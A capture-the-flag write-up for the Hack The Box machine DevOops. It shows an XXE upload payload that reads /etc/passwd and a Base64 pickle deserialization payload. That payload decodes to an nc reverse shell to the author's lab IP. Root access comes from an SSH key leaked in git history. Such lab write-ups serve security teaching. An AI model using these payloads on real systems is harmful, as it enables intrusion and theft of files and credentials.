# DevOops

This is the write-up for the box DevOops that got retired at the 13th October 2018.
My IP address was 10.10.14.15 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.91    devoops.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/devoops.nmap 10.10.10.91
```

```markdown
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 5000)

The web server runs on [Gunicorn](https://github.com/benoitc/gunicorn) which is a **Web Server Gateway Interface (WSGI)** written in Python.
Normally such an application sits between Nginx and Python, because Nginx can't call Python directly.

On the web page it shows the following text:
```markdown
Under construction!
This is feed.py, which will become the MVP for Blogfeeder application.

TODO: replace this with the proper feed from the dev.solita.fi backend.
```

In the HTML source code it displays the _/feed_ directory which shows an image of an RSS feed with no interesting information.
Lets search for hidden directories with **Gobuster**:
```markdown
gobuster -u http://10.10.10.91:5000 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It finds the _/upload_ directory where it is possible to upload files:

![DevOops Upload page](https://kyuu-ji.github.io/htb-write-up/devoops/devoops_web-1.png)

Lets send the requests to a proxy tool like **Burpsuite** to analyze this functionality.
When uploading a text file it doesn't show any special response, so lets send something with the XML elements:
```markdown
POST /upload HTTP/1.1
(...)

-----------------------------18436640097396874571627245540
Content-Disposition: form-data; name="file"; filename="test.xml"
Content-Type: text/xml

<Test>
	<Author>Test1</Author>
	<Subject>Test2</Subject>
	<Content>Test3</Content>
</Test>

-----------------------------18436640097396874571627245540--
```

Now it shows a different HTTP response:
```markdown
PROCESSED BLOGPOST:
Author: Test1
Subject: Test2
Content: Test3
URL for later reference: /uploads/test.xml
File path: /home/roosa/deploy/src
```

As XML gets processed, the next step is to exploit this with an **XML External Entity (XXE)** vulnerability.

### Exploiting XML External Entity

I will use a [Classic XXE from PayloadsAllTheThings repository](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/Files/Classic%20XXE%20-%20etc%20passwd.xml) and modify it with the XML elements:
```markdown
POST /upload HTTP/1.1
(...)

Content-Disposition: form-data; name="file"; filename="test.xml"
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<Test>
	<Author>&file;</Author>
	<Subject>Test2</Subject>
	<Content>Test3</Content>
</Test>
```

This works and displays the usernames from _/etc/passwd_ and this way reading files on the box is possible.
I automated this process with a Python script _devoops_xxe.py_ that can be found in this repository.

Lets read _feed.py_ from the current directory:
```python
(...)
@app.route("/newpost", methods=["POST"])
def newpost():
  # TODO: proper save to database, this is for testing purposes right now
  picklestr = base64.urlsafe_b64decode(request.data)
#  return picklestr
  postObj = pickle.loads(picklestr)
  return "POST RECEIVED: " + postObj['Subject']


# TODO: VERY important! DISABLED THIS IN PRODUCTION
# app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')
# TODO: Replace run-gunicorn.sh with real Linux service script
# app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')
(...)
```

This directory _/newpost_ was not found by our initial directory enumeration, so lets examine that.
It only accepts POST parameters and grabs request data to load it into _pickle.loads_ and execute it.

As the [Python module pickle](https://docs.python.org/3/library/pickle.html) is not secure, it is possible to execute arbitrary code.
I created a script to exploit this that can be found in this repository:
```markdown
python devoops_exploit-pickle.py
```

This script Base64-encodes the reverse shell command in the exploit, which now has to be sent to the box:
```markdown
POST /newpost HTTP/1.1
Host: 10.10.10.91:5000
(...)
Content-Type: text

Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xNC4xNSA5MDAxID4vdG1wL2YnCnAxCnRwMgpScDMKLg==
```

After sending the request, the listener on my IP and port 9001 starts a reverse shell session as _roosa_.

## Privilege Escalation

This user has a home directory _/home/roosa_ that has some interesting files in it.
After searching for a while, we find a private SSH key _/home/roosa/deploy/resources/integration/authcredentials.key_ and when comparing that to the private SSH key _/home/roosa/.ssh/id_rsa_ they are not the same.

On this box are some non-default users and root:
- git
- osboxes
- blogfeed
- root

After copying the SSH key and trying it on all of these users, unfortunately none of them work.

The user has another folder _/home/roosa/work/blogfeed_ which looks like a copy of the initial web page, where the same SSH key can also be found in _/home/roosa/work/blogfeed/resources/integration/authcredentials.key_.
This directory has a _.git_ file, which means that it is a **Git repository**.

When looking at the history of the repository with `git log` there are some interesting commits:
```markdown
commit 33e87c312c08735a02fa9c796021a4a3023129ad
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:33:06 2018 -0400

    reverted accidental commit with proper key

commit d387abf63e05c9628a59195cec9311751bdb283f
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:32:03 2018 -0400

    add key for feed integration from tnerprise backend
```

The user reverted an accidental commit, which was probably the one before it. Lets check the difference between the current version and the version with the accident:
```markdown
git diff d387abf63e05c9628a59195cec9311751bdb283f
```

It shows a different private SSH key, that will be copied again and tried out on the found usernames:
```markdown
chmod 600 rsa_key

ssh -i rsa_key root@10.10.10.91
```

The SSH key works with root!
